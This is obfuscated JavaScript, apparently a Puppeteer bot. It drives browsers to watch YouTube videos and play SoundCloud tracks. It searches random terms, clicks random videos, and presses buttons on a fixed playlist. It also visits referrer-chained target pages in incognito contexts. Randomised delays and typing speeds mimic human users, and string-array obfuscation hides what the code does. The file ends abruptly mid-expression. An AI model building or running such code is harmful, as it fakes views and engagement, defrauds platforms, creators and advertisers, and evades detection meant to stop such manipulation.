const X = b,
  W = c,
  V = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1 * 0x1093 + -0x4 * 0x1d2 + 0x4 * 0x5f7))) + i;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x766 * -0x2 + -0x1 * -0x108e + 0xfad * -0x2);
    let h = e[f];
    if (c['KSHRYj'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x174 + 0x11 * -0x16a + 0x1a * 0xfb, r, s, t = -0x20 * -0x62 + -0xe23 + -0x1 * -0x1e3; s = m['charAt'](t++); ~s && (r = q % (0x16 * 0x183 + -0xda7 + -0x1397) ? r * (-0x1 * -0x2216 + -0x245d + -0x287 * -0x1) + s : s, q++ % (0x22a3 + 0x1190 + -0x342f)) ? o += String['fromCharCode'](0x10f * -0x5 + -0x656 + 0xca0 & r >> (-(0x2 * -0x1237 + -0x634 * 0x1 + 0x1 * 0x2aa4) * q & -0x1097 + -0x657 * 0x1 + 0x16f4)) : 0xe42 + 0x983 + -0x17c5 * 0x1) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1 * -0x11d2 + -0x6 * 0x23e + 0x1f46, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0xd03 + 0x16fc + -0x9e9))['slice'](-(0x3 * -0x45d + -0x3 * -0x260 + -0xb * -0x8b));
        }
        return decodeURIComponent(p);
      };
      c['EJyBhb'] = i, b = arguments, c['KSHRYj'] = !![];
    }
    const j = e[-0x1 * -0x170b + 0x871 + -0x1f7c],
      k = f + j,
      l = b[k];
    return !l ? (h = c['EJyBhb'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x13ae * 0x1 + -0x1 * 0xb19 + 0x1ec7), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x5c * 0xae + -0x7e8b + 0xb533 + (-0x2607 + 0xef * -0x11 + 0x707e) * random()) : await standardWaitForNetIdle(f), await wait(-0xaac + 0x2 * -0x1237 + -0x42a2 * -0x1 + (0x3c38 + 0x61d + -0x1b45) * random()), 0xe0d + 0xf * -0x27e + 0x1756;
}

function a() {
  const bm = [
    'flat',
    'nXW6CMhcOgrcW7q7',
    'sume',
    'o\x20base,moo',
    'setUint32',
    'hardcore,h',
    'l2rRyxnQAgr3Aq',
    'lgj0CYbWBgf5ia',
    'zwnRBYKGq2HYBW',
    'lw1VB21VBY1PBW',
    'WPDGF1JdUmkKq8kFW7FdTW',
    'W6bmbmoJWP7dHmoLWQ8',
    'dJ3cLGDurSomALxdGa',
    'tq5ndmofuGZcO3C0',
    'DxbKyxrL',
    '/zyenith/L',
    'lw1VCguTAw8Tyq',
    'W48NcSkG',
    'AgfZ',
    'CbUjuwhQPK'
  ];
  a = function() {
    return bm;
  };
  return a();
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x23f4 + 0x13c5 + 0x23b7), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x2 * -0x875 + 0x7ca + -0x18b3;
}
async function randomWait() {
  return await wait(0x16fc + -0x168b + 0x1317 + (0x1c8 * 0x4 + 0x495 + -0x1 * -0x7d3) * random()), -0x1 * -0x170b + 0x871 + -0x1f7b;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x2 * -0x395 + 0x5d1 * -0x6 + -0x1 * -0x2a10, -0x547 * -0x7 + 0x1b6e + 0x202c * -0x2), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x5009 + 0x1 * -0xaf5b + 0xa * 0x30fa) * getRandomInt(0x6be + 0x2a7 + -0x963, -0x1652 + -0x20 * -0xc9 + -0x2c9 * 0x1), h)), 0x62a + -0x93f + -0x2 * -0x18b;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x8b * 0x27 + -0x9d * 0x4 + -0x12b9;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0xf3a * 0x1 + -0x259 * 0x2 + -0xa87]['split']('\x20');
    for (let k = 0x23b4 + -0x2365 + -0x4f; k < i['length']; k += -0x2386 + -0x6e * -0x1d + -0xb89 * -0x2)
      j += i[k] * h[i[k + (-0xc38 + 0x1 * 0x2055 + -0x141c)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x5cf + 0x1 * 0x12b9 + 0x2 * -0xc41)['map'](l => Array['from'](l['children']))['flat'](-0x20fd + -0x1c81 + -0x5b * -0xad)['map'](l => l['childNodes'][0x8d7 + 0x140f + 0xd * -0x239]['childNodes'][-0xde3 + 0xb11 + 0x2d2]['childNodes'][0x7 * -0x31e + -0xa1e + -0x11 * -0x1e1]['childNodes'][0x1fd6 + -0x1266 + -0x158 * 0xa]['childNodes'][-0x1cdf + -0x10d * -0x10 + -0x304 * -0x4]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0xc7e * 0x1 + 0x1397 + -0x331, 0x13ee * 0x1 + 0x4 * 0x55c + -0x15d6)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x370 * -0x1b + 0x63a0 + -0x1 * -0x33c8);
  const h = await getMaxTime(f),
    i = Math['min']((0x1b617 + 0x5d5 * 0x2a + -0x1c0a9) * getRandomInt(0x2 * -0xda6 + 0x5bf + 0x158f, 0x153e + -0x15df * 0x1 + 0xa6 * 0x1), h);
  return await wait(i), 0x2 * -0x607 + 0x21db + -0x6 * 0x3a2;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0xa8f + 0x1aed + -0x257c]['children'][0x11 * -0x1be + 0x892 * -0x2 + 0x2ec2]['children'][0x1 * -0x1a96 + 0x133 * -0x1a + -0xe71 * -0x4]['children'][0x1ca0 + 0x2a3 + -0x97 * 0x35]['children'][-0x305 + 0x12a2 + -0xf9d]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x1c20 + 0x336 * 0x7 + -0x1 * 0x3299;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1644 + -0x1f80 + 0x9a0 * 0x1 + (-0x204 * 0x1 + -0x2 * 0x44b + 0x1 * 0xacc) * random()
  }), await wait(-0x1c * -0x130 + -0x8 * 0x21e + -0xe5c + (-0x1726 + -0x2 * -0x332 + 0x11ee) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x243b + -0x121c + -0x3659 * -0x1]['childNodes'][-0x117a + -0x4d * 0x26 + 0x1ce9]['childNodes'][-0xbc4 + -0x16c2 + 0x2287]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1 * -0x141b + -0x19fc + 0x34 * 0xe3]['childNodes'][-0x3d * 0x38 + -0xecd + 0x5a1 * 0x5]['childNodes'][0x1 * 0x2321 + 0x255b + -0x487a]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        const R = d;
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))[R(0x0)](-0x1aa + -0x172f + -0x2 * -0xc6d),
          r = -0x2411 * -0x1 + -0x52 * 0x3e + 0x1cd * -0x9;
        for (let u = -0x316 + 0x1a * 0xbf + -0x1050; u < q['length']; u += 0xc1 * -0x23 + 0x1 * -0x1bc7 + 0x1 * 0x362c)
          r += q[u] * k[q[u + (-0x5 * 0x59e + -0x3df * -0x1 + -0x307 * -0x8)]];
        return r;
      }(n);
  });
  await wait((0x5e46 + 0x4f49 + -0x60d * 0x13) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0xcc * -0x1e7 + 0x7 * -0x5b + -0x1 * 0x9737) * getRandomInt(0xd6b * 0x1 + -0x156 * -0x13 + -0x1366 * 0x2, -0x14e * -0x11 + 0x12c8 + 0x1 * -0x28ec), h + (0x29 * 0x1 + -0x2087 + 0xb6 * 0x49));
  return await wait(i), -0x2152 + 0x3 * -0x6ad + 0x355a;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1711 + 0x7e7 + -0x1ef8), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x3ea + -0x17a5 + 0x61 * 0x53 + (0x1151 * 0x2 + -0x23ae + -0x2 * -0x27a) * Math['random']());
    });
  }, 0x22dc + 0x621 + 0x7 * -0x1f3);
  await wait(-0x8edbd + 0x2e79a + 0xa9a03);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x17 * 0x4cb + 0x7 * 0x39a7 + -0x1176e) * getRandomInt(-0x1b73 * 0x1 + 0x2 * -0xfd7 + 0x13b7 * 0x3, -0x1 * -0xc85 + -0xb5f + -0x1 * 0x10d)), clearInterval(h), -0x4b0 + 0x2336 + -0x1e85 * 0x1;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x127d + 0x14ff + -0x3 * 0xd6;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x4ac + 0x1f9b + -0x2446;
    await randomWait();
  }
  return -0x11 * -0x212 + -0x1141 + 0x11f0 * -0x1;
}

function fetchRandomSC() {
  return Math['random']() <= 0x303 * 0x6 + 0x2586 + -0x3798 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x162d + 0x165d + 0x30 * -0x1 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x766 * -0x2 + -0x1 * -0x108e + 0xfad * -0x2);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1022 + 0xf * -0x10d + 0x1fe5 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x98 + 0x533 + 0x189 * -0x3;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x1 * 0xcb17 + 0x1 * -0xe75e + -0xd * -0x2ef1 + getRandomInt(0x1 * 0x11bd + 0x65cf * 0x1 + -0x3cf4, 0xc8bc + 0x1 * -0x306f + -0x231d * 0x1));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x11ce + -0x5c3 + -0xc0a), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1230 + 0x130 * -0x10 + 0x46 * 0x88;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x489 + 0x4 * 0x303 + -0x1095, 0x17b4 + 0x24b4 + -0x3c36)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x648 + -0xa * -0x27 + 0x2 + floor((0x1186 * -0x1 + -0x5 * 0x20e + 0x1 * 0x1fb4) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x3b4fc972 + 0x1d9dd * 0x7606 + -0x1f272fbc),
          -0x7 * -0x57a8b + 0x1292ca + -0x5 * -0xe3715,
          -0x54e * -0x7 + -0x2429 + -0x1 * -0x7f07,
          0x1247 + -0x11 * 0xca + 0x1 * -0x45d
        ], y = [
          0x4 * 0x6d3 + 0x68 * 0x11 + -0x221c,
          0x4f2 + -0x58 * -0x3 + -0x5ea,
          -0x7ac + -0x5 * -0x793 + -0x1e2b * 0x1,
          -0x1 * -0x189e + 0x1ae9 + 0x3387 * -0x1
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            const S = c;
            return new G(-0x4c5 * -0x3 + 0x138b + -0x21d9)[S(0xe)](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x5a2 + -0x89e + -0x98 * -0x18; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1bf0 + 0x116 * -0x23 + -0x2 * -0x509) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x1996 + -0x8f5 * -0x2 + 0x7ac] = A[-0x2a6 + 0x3 * 0xb49 + 0x7 * -0x473] = A[-0x1 * -0x20c + -0x1e43 + 0x1c38] = A[0x24b6 + 0x207e + -0x4532] = A[0x2094 + 0xbee + -0x1 * 0x2c7f] = A[-0x1a85 + 0x1e37 + -0x3ae] = A[-0x2363 + -0x5 * -0x249 + -0x36d * -0x7] = A[0xde1 * -0x1 + -0xc8e + 0x1a75] = A[-0x46c + 0x2 * 0x676 + 0xf1 * -0x9] = A[-0xdfd + 0x1e08 + -0x1003] = A[0x2017 + 0x98e + -0x299c] = A[-0x85 * 0x3d + 0xd9 * 0x7 + -0x4 * -0x673] = A[0x1 * -0x19cf + -0x2 * -0x44d + 0x1140] = A[-0x253b + -0x69a + 0x2be1] = A[0x1590 + 0x4d2 * -0x8 + -0x9 * -0x1e5] = A[-0x1e21 + 0x1 * 0xe6 + 0x1d49] = A[-0x1 * -0x139d + -0x1 * -0x19ae + 0x90c * -0x5] = -0x1192 + 0x112 * 0x21 + -0x1 * 0x11c0, this['blocks'] = A) : this['blocks'] = [
                -0x1a14 + 0x1983 + -0x91 * -0x1,
                -0x1475 + -0xa2c + 0x1ea1,
                0x2 * 0x8f9 + -0x1dc + -0x1016,
                0xea + -0x18be + 0x17d4,
                0x1 * 0x1321 + 0xfdf + -0x2300,
                0xa22 + -0xe * 0x21 + -0x854,
                -0x107c + -0x262 + 0x12de,
                -0x25e3 * 0x1 + -0xa45 * -0x1 + 0x1b9e,
                -0xc77 * -0x3 + -0x1 * 0x1101 + -0x1464,
                -0xfeb * 0x2 + 0x1cb8 + 0x31e,
                0x1 * 0x975 + -0x1 * -0x97c + -0x12f1,
                -0x443 * -0x7 + -0x2 * 0xd11 + 0x3b3 * -0x1,
                0x25 * -0xb7 + -0xb66 + 0x25d9,
                0x15 * -0x11 + 0x2 * -0x473 + 0xa4b,
                0x329 + 0x2 * -0xb6a + 0x13ab,
                0x6c5 * -0x4 + 0x1 * 0x1009 + 0xb0b,
                0x1 * -0x431 + -0x2681 + 0x2ab2
              ], this['h0'] = -0xb02d8574 + 0x757d0a14 + 0x7b0811 * 0x151, this['h1'] = 0x213 * -0xa1ea31 + -0x1af094c3d + -0x21 * -0x1e817249, this['h2'] = 0x142 * 0xa7eb37 + 0x9da03b35 + -0xd81b3965, this['h3'] = -0x87e744a + 0xf013e28 + 0x9af8a98, this['h4'] = -0x17a505 * -0x1002 + -0x8e6319 * 0x232 + 0x81e8d4c8, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0xc4a + -0x79d * 0x5 + -0x19c7 * -0x1, this['finalized'] = this['hashed'] = -0x1d * 0xf9 + -0x24 * 0x97 + -0x3 * -0x107b, this['first'] = 0xb * -0xe9 + -0xfe * -0x1a + -0x28 * 0x65;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1 * 0xab5 + 0x4 * -0x703 + -0x17 * -0xc1, O = J['length'] || -0x1c89 + 0xb8 * -0x26 + 0x37d9, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1608 + 0x24 * 0x100 + 0x95 * -0x18, P[-0x7f4 * 0x2 + -0x5 * 0x2b3 + 0x1d67] = this['block'], P[-0x12c0 + -0x31b + 0xb5 * 0x1f] = P[-0x16d8 + -0xd18 + 0xbfb * 0x3] = P[-0x1208 + 0xf21 + -0x2e9 * -0x1] = P[0x2d7 + 0x18f9 + -0x287 * 0xb] = P[0x24bf * 0x1 + -0xa39 * 0x3 + 0xc2 * -0x8] = P[0x2537 + 0xb0b * -0x2 + 0x1 * -0xf1c] = P[0xf62 + -0x334 + -0xc28] = P[-0x5 * -0x93 + 0x1f3d + -0x5 * 0x6d1] = P[-0x2640 + 0xaf * -0x17 + 0x3601] = P[0x3 * -0x542 + 0x1 * 0x1f0f + -0xf40] = P[-0x36 * -0x26 + 0x1 * 0x1d9b + -0x2595] = P[0x49 * -0x30 + 0x246f + 0x4 * -0x5ad] = P[-0x176 * -0x4 + 0x1860 + -0x1e2c] = P[0x58d + -0x655 * 0x1 + 0xd5 * 0x1] = P[0x39 * 0x59 + 0x6a1 + 0x2 * -0xd32] = P[0xa2e + 0x985 * 0x1 + -0x13a4] = -0x24b * 0x7 + 0xb09 * 0x1 + 0x504), K) {
                    for (N = this['start']; M < O && N < -0x1 * -0x2128 + -0x11f1 + -0xef7; ++M)
                      P[N >> -0x33 * 0x2 + 0xc9b + -0xc33] |= J[M] << y[-0x148b + 0x2094 + 0x201 * -0x6 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x2578 + 0x1 * -0xef + -0x26a7 * -0x1; ++M)
                      (L = J['charCodeAt'](M)) < 0x1669 + 0x8d3 + -0x1ebc ? P[N >> -0x3 * -0x3b5 + 0x18f1 + -0x240e] |= L << y[0x207a + 0xf * -0x69 + 0x8 * -0x34a & N++] : L < -0x39f + 0x230 * 0xe + 0x2b7 * -0x7 ? (P[N >> 0x1 * 0x782 + 0x72e + -0x1 * 0xeae] |= (-0x1b7f + -0x21ec + -0x3e2b * -0x1 | L >> 0x1084 + 0x1b2f + -0x2bad) << y[0x1 * 0x287 + -0x241 + 0x1 * -0x43 & N++], P[N >> 0x1572 + 0x1 * 0x1492 + -0x2a02] |= (0x327 * -0x7 + 0x4 * -0x166 + -0x9 * -0x321 | -0x83c * -0x1 + -0x1b44 + 0x1347 & L) << y[-0x1 * 0x1f5e + -0xad7 + 0x2a38 & N++]) : L < 0xb * 0x1995 + 0x50bf + 0x59f * -0x1a || L >= 0xf321 + 0x14e70 + -0x16191 ? (P[N >> 0x10 * 0x173 + 0x2d7 * 0x5 + -0x2561] |= (-0x11 * 0x186 + 0x2 * -0x6c7 + 0x2854 | L >> 0x99d + -0x3a7 * -0x1 + 0x5e * -0x24) << y[-0x1a1c + 0xd6a * 0x2 + -0xb5 & N++], P[N >> -0x1 * 0x1111 + -0x2555 + 0x3668] |= (-0x1 * -0xb51 + 0x4f * -0x50 + -0x35 * -0x43 | L >> -0x246 + -0x1149 + 0x1395 & -0x2eb + -0xba7 + 0xed1) << y[-0x1 * 0x985 + 0x219b + 0x1813 * -0x1 & N++], P[N >> -0x1 * -0x1607 + 0x18ef + -0x2ef4] |= (0xca0 + -0x1050 + -0x8 * -0x86 | -0x22a4 + 0x1af1 + 0x2 * 0x3f9 & L) << y[0x74 * 0x35 + -0x14b * 0x3 + -0x1420 & N++]) : (L = -0x7 * 0x1217 + 0x11fe * -0xb + 0x2448b + ((0x100d + 0x623 * 0x4 + -0x3a9 * 0xa & L) << 0x213b + 0x46a + -0x3 * 0xc89 | -0x652 * 0x1 + 0x2 * -0x4a + 0xae5 & J['charCodeAt'](++M)), P[N >> 0x2194 + 0x11f1 + -0x3383] |= (-0x1 * 0x791 + -0x120f + 0x190 * 0x11 | L >> -0x4f1 + 0xb3c + -0x639 * 0x1) << y[0x1 * -0x7d6 + 0x1 * -0x193c + 0x2115 & N++], P[N >> -0x19c * 0x7 + -0x1dcc * 0x1 + 0x2912] |= (-0x21d * 0x1 + 0x5 * 0x187 + 0x283 * -0x2 | L >> -0x3a6 + 0x1869 * 0x1 + -0x14b7 & -0x2 * 0x11da + 0x53 * -0x6a + 0x2f * 0x17f) << y[-0x504 + -0xf95 * -0x1 + -0xa8e & N++], P[N >> -0x243e + 0x2e2 + 0x215e] |= (-0x1e76 + 0x24cb + 0x5d5 * -0x1 | L >> -0x13 * 0x13d + 0x17 * -0x3e + -0x7 * -0x429 & 0x133 + -0x17f3 + 0x16ff) << y[0x1 * -0x1c1e + 0x199 * 0x4 + -0x15 * -0x109 & N++], P[N >> 0x113c * -0x1 + 0xb19 + 0x625] |= (-0x11d * -0x23 + -0x1c30 + 0xa47 * -0x1 | -0x7 * 0x271 + -0x912 + -0x4 * -0x69a & L) << y[0x23a0 + -0x4 * -0x19a + -0x2a05 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x9e2 + -0x71 * -0x1 + -0xa13 ? (this['block'] = P[0x1d83 + -0x4e4 * 0x1 + 0x1 * -0x188f], this['start'] = N - (0x1 * -0x72f + 0x26da + -0x47d * 0x7), this['hash'](), this['hashed'] = 0x1e79 + 0x1616 + -0x348e) : this['start'] = N;
                }
                return this['bytes'] > 0x315b8 * -0x1bda + 0x1e1479ad7 + 0x22d72d0a * -0x4 && (this['hBytes'] += this['bytes'] / (0x2db6 * -0x328de + -0xc9faf260 + 0x25a690634) << -0x12 * 0x18b + 0x718 * -0x3 + 0x12b * 0x2a, this['bytes'] = this['bytes'] % (0x11e8b6218 + -0x166 * -0x1216e2 + -0x37d76224)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x2 * 0x4e7 + 0x13ab + -0x1 * 0x9dc;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x11e3 + -0x28c + -0xf47] = this['block'], J[K >> 0x481 + -0x1377 + -0x4 * -0x3be] |= x[0x137 * 0x4 + -0x1 * 0x70 + 0x469 * -0x1 & K], this['block'] = J[0x1297 + -0x1 * -0x24da + -0x3761], K >= -0x49a * -0x1 + 0x21 * 0x9e + -0x18c0 && (this['hashed'] || this['hash'](), J[-0x1 * 0x1106 + 0x17 * 0x56 + 0xa * 0xee] = this['block'], J[0x44 + -0x2f8 + -0x4 * -0xb1] = J[0xabf + 0x20d7 + -0x2b95] = J[0x111f + 0x24f8 * 0x1 + -0x3615] = J[-0x4f * -0x7c + 0xbd8 + -0x3219] = J[-0x5e * -0x1c + 0x11cc + 0x1 * -0x1c10] = J[0x2483 + 0x2368 + 0x1 * -0x47e6] = J[-0x24c3 + 0x17b0 + 0xd19] = J[0xe05 + 0xd9 * 0x1d + -0x2693 * 0x1] = J[-0x1 * 0x240f + -0x11 * 0x18c + 0x1 * 0x3e63] = J[0x8b + 0x1f78 + -0x1ffa] = J[0x1 * 0x186e + -0x1f52 + -0x2 * -0x377] = J[0x763 + 0x1 * 0x23f + -0x997] = J[-0x2289 + -0x238f + 0x4624] = J[0x1 * -0x1943 + 0x27b * -0x1 + 0x58f * 0x5] = J[0x9 * 0x1ed + 0x1 * -0x1039 + 